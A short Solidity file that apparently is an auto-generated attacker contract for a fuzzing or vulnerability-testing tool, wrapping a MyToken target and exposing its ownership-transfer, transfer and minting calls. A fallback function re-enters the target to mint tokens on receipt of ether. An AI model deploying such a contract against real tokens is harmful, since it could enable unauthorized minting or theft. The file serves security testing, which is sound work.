pragma solidity ^0.4.19;

import "./MyToken.sol";

contract Attack_MyToken1 {

  MyToken public target_contract;

  function Attack_MyToken1(address _targetContract) public payable {
      target_contract = MyToken(_targetContract);
  } 

  function vultron_transferOwnership(address newOwner) public {
    target_contract.transferOwnership(newOwner);
  } 

  function vultron_transfer(address _to, uint256 _value) public {
    target_contract.transfer(_to, _value);
  } 

  function vultron_mintToken(address target, uint256 mintedAmount) public {
    target_contract.mintToken(target, mintedAmount);
  } 

      function() public payable {
        
        target_contract.mintToken(this, 1000);
      }
      } 
